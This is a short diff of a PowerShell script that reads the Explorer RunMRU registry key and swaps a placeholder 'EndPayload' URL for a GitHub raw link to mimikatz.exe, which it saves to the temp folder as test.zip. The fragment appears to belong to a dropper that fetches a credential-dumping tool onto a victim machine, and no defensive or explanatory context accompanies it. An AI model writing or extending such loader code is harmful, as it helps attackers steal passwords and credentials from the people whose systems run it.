@@ -8,7 +8,7 @@ function Unzip
 
 $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" 
 $arr = (Get-Item -Path $path).Property 
-$url = "www.linkToEndPayload"
+$url = "https://github.com/ChandraOrbit/CHS/raw/master/mimikku/x64/mimikatz.exe"
 $output = "$env:temp/test.zip";
 $out = "$env:temp/Remake.txt";
 
